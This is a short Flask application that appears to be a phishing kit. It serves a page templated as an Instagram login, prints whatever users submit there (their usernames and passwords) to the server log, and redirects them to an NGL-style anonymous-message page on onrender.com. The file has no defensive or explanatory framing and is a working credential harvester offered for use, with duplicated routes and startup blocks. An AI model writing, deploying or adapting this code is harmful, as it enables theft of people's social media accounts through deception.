from flask import Flask, render_template, request, redirect
import logging

app = Flask("__main__", template_folder="/opt/render/project/src/templates", static_folder="/opt/render/project/src/static")
logging.basicConfig(level=logging.DEBUG)


@app.route("/shi.spill.the.tea")
def saanvi_17():
    return render_template("home.html")


@app.route("/timeout")
def abc():
    return render_template("Login • Instagram.html")


@app.route("/after")
def after():
    return render_template("after.html")


@app.route("/timeout", methods=["POST", "GET"])
def run_insta_code():
    if request.method == "POST":
        print(request.form)
        return redirect("https://ngl.onrender.com/shi.spill.the.tea")


@app.route("/shi.spill.the.tea", methods=["POST", "GET"])
def run_ngl_code():
    if request.method == "POST":
        print(request.form)
        return redirect("https://ngl.onrender.com/after")


if __name__ == "__main__":
    app.run()


if __name__ == "__main__":
    app.run(host="0.0.0.0")
